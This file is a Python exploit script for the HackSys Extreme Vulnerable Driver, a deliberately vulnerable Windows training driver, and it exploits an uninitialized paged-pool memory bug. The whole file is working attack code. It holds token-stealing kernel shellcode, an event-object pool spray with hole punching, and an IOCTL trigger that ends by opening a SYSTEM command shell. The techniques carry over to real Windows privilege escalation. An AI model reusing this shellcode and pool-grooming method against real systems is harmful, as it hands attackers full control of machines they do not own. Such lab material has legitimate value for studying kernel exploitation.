from helper import *
from ctypes import *

def ioctl(function, devicetype = 0x00000022, access = 0x00000000, method = 0x00000003):
	return ((devicetype << 16) | (access << 14) | (function << 2) | method)

def main():
	HEVD_IOCTL_UNINITIALIZED_MEMORY_PAGED_POOL = ioctl(0x80C)
	lpFileName = "\\\\.\\HackSysExtremeVulnerableDriver"
	handle = get_handle(lpFileName)
	object_handles = []

	steal_token = (
		"\x60"                              # pushad
		"\x33\xc0"                          # xor   eax,eax
		"\x64\x8b\x80\x24\x01\x00\x00"      # mov   eax,DWORD PTR fs:[eax+0x124]
		"\x8b\x40\x50"                      # mov   eax,DWORD PTR [eax+0x50]
		"\x8b\xc8"                          # mov   ecx,eax
		"\x8b\x80\xb8\x00\x00\x00"          # mov   eax,DWORD PTR [eax+0xb8]
		"\x2d\xb8\x00\x00\x00"              # sub   eax,0xb8
		"\x83\xb8\xb4\x00\x00\x00\x04"      # cmp   DWORD PTR [eax+0xb4],0x4
		"\x75\xec"                          # jne   0xe
		"\x8b\x90\xf8\x00\x00\x00"          # mov   edx,DWORD PTR [eax+0xf8]
		"\x89\x91\xf8\x00\x00\x00"          # mov   DWORD PTR [ecx+0xf8],edx
		"\x61"                              # popad
		"\xc3"                              # retn
	)

	# Allocate 'shellcode' at 0x42424242
	shellcode = "\x90" * 0x08
	shellcode += steal_token
	shellcode += "\x90" * (0x80 - 0x08 - len(steal_token))
	alloc_memory(0x42424242, shellcode, len(shellcode))

	# The size of the structure is 0xf0 (240 bytes)
	# typedef struct _UNINITIALIZED_HEAP_VARIABLE {
	#    ULONG_PTR Value;                   # 4 bytes      ---+
	#    FunctionPointer Callback;          # 4 bytes         |=> 240 bytes
	#    ULONG_PTR Buffer[58];              # 4 * 58 bytes ---+
	# } UNINITIALIZED_HEAP_VARIABLE, *PUNINITIALIZED_HEAP_VARIABLE;
	heap_variable = p32(0x41414141) + p32(0x42424242) + "\x42" * (0xf0 - 4 - 4 - 4)

	# Spraying the Non-Paged Pool with Event Objects
	print("[+] Spraying Non-Paged Pool with Event Objects...")
	for element in range(10000):
		lpName = heap_variable + str(element).zfill(4)
		handles = kernel32.CreateEventW(
						None,               # _In_opt_ LPSECURITY_ATTRIBUTES
						True,               # _In_     BOOL
						False,              # _In_     BOOL
						lpName)             # _In_opt_ LPCTSTR
		object_handles.append(handles)

	# Creating holes in the sprayed region
	make_holes_sprayed_region(10000, object_handles)

	# Alloc an input buffer with a wrong magic value
	payload = p32(0xbad0b0b1)

	# The vulnerable function will responses with an exception code by
	# sending a wrong magic value; the 'trigger' function will stop due
	# to this exception.
	print("[+] Triggering vulnerable IOCTL ...")
	device = kernel32.DeviceIoControl(
				handle,                                     # _In_        HANDLE
				HEVD_IOCTL_UNINITIALIZED_MEMORY_PAGED_POOL, # _In_        DWORD
				payload,                                    # _In_opt_    LPVOID
				len(payload),                               # _In_        DWORD
				None,                                       # _Out_opt_   LPVOID
				0,                                          # _In_        DWORD
				byref(c_ulong()),                           # _Out_opt_   LPDWORD
				None)                                       # _Inout_opt_ LPOVERLAPPED

	# Free allocated memory
	free_all_alloc(10000, object_handles)

	if is_system():
		print("[+] Spawn SYSTEM shell\n")
		os.system("cmd.exe")
	else:
		print("[-] Exploit failed")

if __name__ == "__main__":
	main()
